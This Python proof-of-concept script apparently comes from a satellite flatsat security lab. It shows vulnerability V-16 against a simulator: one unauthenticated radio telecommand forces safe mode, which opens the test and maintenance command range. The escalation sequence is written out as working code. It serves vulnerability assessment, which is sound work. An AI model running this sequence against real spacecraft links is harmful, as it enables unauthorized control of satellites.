#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-16  Commands run with implied privileges: the TEST APID window
# (0xF0-0xFF, 'root-CAN' analogue) is gated ONLY by safe-mode -- and any
# attacker can force safe-mode (V-22). Escalation: normal TC -> force
# safe -> maintenance channel open, unauthenticated.
# SPARTA: PR-0002 (privilege escalation) / EX-0009.02
def main(dev, ev):
    r = dev.tc(0xF0, b"", via="radio")
    check(dev.err_text(r) == "TESTMODE INACTIVE",
          "maintenance channel locked in NOMINAL")
    ev.log("NOMINAL: TEST APID 0xF0 -> 'TESTMODE INACTIVE'")
    # force safe mode with one unauthenticated TC (see V-22)...
    dev.tc(0x1D, bytes([2]), via="radio")
    # ...and the maintenance window is now open for every raw-radio TC:
    for apid in (0xF0, 0xF5, 0xFF):
        t = dev.find(dev.tc(apid, b"", via="radio"), apid)
        check(t and t[0].payload == bytes([apid]) + b"TEST",
              f"TEST APID 0x{apid:02X} must execute in safe mode")
        ev.log(f"safe mode: TEST APID 0x{apid:02X} -> {t[0].payload!r}")
    ev.log("TEST commands carry no authentication of their own: whoever "
           "drops the craft into safe mode owns the maintenance channel")
    dev.tc(0x1D, bytes([3]), via="radio")            # attempt release
    ev.log("release attempt inside the 120 s window -> 'RELEASE WINDOW' "
           "(maintenance stays open meanwhile)")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-16 implied privileges / TEST window", main))
